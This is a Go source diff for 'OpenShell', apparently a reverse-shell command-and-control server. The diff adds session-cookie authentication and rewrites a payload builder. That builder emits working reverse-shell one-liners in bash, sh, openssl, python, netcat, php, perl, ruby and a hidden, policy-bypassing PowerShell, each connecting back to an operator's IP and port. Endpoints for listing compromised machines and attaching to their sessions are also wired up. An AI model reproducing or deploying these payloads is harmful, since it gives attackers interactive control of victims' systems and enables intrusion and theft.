@@ -7,8 +7,10 @@ import (
     "io"
     "net/http"
     "strconv"
+    "sync"
 
     "crypto/sha256"
+    "crypto/rand"
     "encoding/hex"
     "encoding/json"
 
@@ -38,18 +40,77 @@ var manager = NewSessionManager()
 var upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
 var passwordHash = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92" //123456
 
+var sessions = struct {
+    sync.RWMutex
+    m map[string]bool
+}{m: make(map[string]bool)}
+
 type LoginReq struct{ Password string `json:"password"` }
 
+//Middleware for authentication
+func requireAuth(next http.HandlerFunc) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+
+        cookie, err := r.Cookie("openshell_session")
+
+        valid := false
+        if err == nil {
+            sessions.RLock()
+            valid = sessions.m[cookie.Value]
+            sessions.RUnlock()
+        }
+
+        if !valid {
+            if r.URL.Path != "/" {
+                http.Redirect(w, r, "/", http.StatusFound)
+                return
+            }
+        }
+
+        next(w, r)
+    }
+}
+
+func generateToken() string {
+    b := make([]byte, 32) //256-bit token
+    rand.Read(b)
+
+    return hex.EncodeToString(b)
+}
+
 func loginHandler(w http.ResponseWriter,r *http.Request){
-    if r.Method!="POST"{http.Error(w,"Method not allowed",405); return}
+    if r.Method != "POST" {
+        http.Error(w,"Method not allowed",405);
+        return
+    }
+
     body,_ := io.ReadAll(r.Body)
+
     var req LoginReq
     json.Unmarshal(body,&req)
-    sum:=sha256.Sum256([]byte(req.Password))
-    if hex.EncodeToString(sum[:])==passwordHash{
+
+    sum := sha256.Sum256([]byte(req.Password))
+
+    if hex.EncodeToString(sum[:]) == passwordHash {
+        token := generateToken()
+
+        sessions.Lock()
+        sessions.m[token] = true
+        sessions.Unlock()
+
+        http.SetCookie(w, &http.Cookie {
+            Name: "openshell_session",
+            Value: token,
+            Path: "/",
+            HttpOnly: true,
+            Secure: true,
+            SameSite: http.SameSiteStrictMode,
+        })
+
         w.WriteHeader(200)
         return
     }
+
     http.Error(w,"Wrong password",401)
 }
 
@@ -63,33 +124,33 @@ func builderHandler(w http.ResponseWriter, r *http.Request) {
     payload := ""
 
     switch lang {
+        case "bash":
+            payload = fmt.Sprintf(`bash -c 'exec 5<>/dev/tcp/%s/%s; script -qc /bin/bash /dev/null <&5 >&5 2>&5'`, ip, port)
 
-    case "bash":
-        payload = fmt.Sprintf(`bash -c 'exec 5<>/dev/tcp/%s/%s; script -qc /bin/bash /dev/null <&5 >&5 2>&5'`, ip, port)
+        case "sh":
+            payload = fmt.Sprintf(`sh -c 'exec 5<>/dev/tcp/%s/%s; script -qc /bin/sh /dev/null <&5 >&5 2>&5'`, ip, port)
 
-    case "sh":
-        payload = fmt.Sprintf(`sh -c 'exec 5<>/dev/tcp/%s/%s; script -qc /bin/sh /dev/null <&5 >&5 2>&5'`, ip, port)
-    
-    case "openssl":
-        payload = fmt.Sprintf(`rm -f /tmp/s;mkfifo /tmp/s;script -qc /bin/bash /dev/null </tmp/s | openssl s_client -quiet -connect %s:%s >/tmp/s`, ip, port)
+        case "openssl":
+            payload = fmt.Sprintf(`rm -f /tmp/s;mkfifo /tmp/s;script -qc /bin/bash /dev/null </tmp/s | openssl s_client -quiet -connect %s:%s >/tmp/s`, ip, port)
 
-    case "python":
-        payload = fmt.Sprintf(`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("%s",%s));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`, ip, port)
+        case "python":
+            payload = fmt.Sprintf(`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("%s",%s));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`, ip, port)
 
-    case "nc":
-        payload = fmt.Sprintf(`nc %s %s -e /bin/bash`, ip, port)
+        case "nc":
+            payload = fmt.Sprintf(`rm -f /tmp/s;mkfifo /tmp/s;script -qc /bin/bash /dev/null </tmp/s | nc %s %s >/tmp/s`, ip, port)
 
-    case "php":
-        payload = fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s); exec("script -qc /bin/bash /dev/null <&3 >&3 2>&3");'`, ip, port)
+        case "php":
+            payload = fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s); exec("script -qc /bin/bash /dev/null <&3 >&3 2>&3");'`, ip, port)
 
-    case "perl":
-        payload = fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`, ip, port)
+        case "perl":
+            payload = fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("script -qc /bin/bash /dev/null");'`, ip, port)
 
-    case "ruby":
-        payload = fmt.Sprintf(`ruby -rsocket -e 'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/bash -i <&%%d >&%%d 2>&%%d",f,f,f)'`, ip, port)
+        case "ruby":
+            payload = fmt.Sprintf(`ruby -rsocket -e 'f=TCPSocket.open("%s",%s).to_i;exec sprintf("script -qc /bin/bash /dev/null <&%%d >&%%d 2>&%%d",f,f,f)'`, ip, port)
 
-    case "powershell":
-        payload = fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`, ip, port)
+        case "powershell":
+            payload = fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`, ip, port)
+
 
     }
 
@@ -174,13 +235,15 @@ func main(){
 
     http.HandleFunc("/api/login",loginHandler)        //Login authentication
 
-    http.HandleFunc("/api/builder",builderHandler)    //Payload builder
-    http.HandleFunc("/api/stats",statsHandler)        //Show online machines
-    http.HandleFunc("/api/sessions",sessionsHandler)  //Obtain sessions
-    http.HandleFunc("/ws/session",attachHandler)      //Buffer handler
+    http.HandleFunc("/api/builder", requireAuth(builderHandler))    //Payload builder
+    http.HandleFunc("/api/stats", requireAuth(statsHandler))        //Show online machines
+    http.HandleFunc("/api/sessions", requireAuth(sessionsHandler))  //Obtain sessions
+    http.HandleFunc("/ws/session", requireAuth(attachHandler))      //Buffer handler
 
     fs := http.FileServer(http.Dir("../web"))
-    http.Handle("/",fs)
+    http.Handle("/", requireAuth(func(w http.ResponseWriter, r *http.Request) {
+        fs.ServeHTTP(w, r)
+    }))
 
     logger.Success("OpenShell server running on: %d", *port)
 
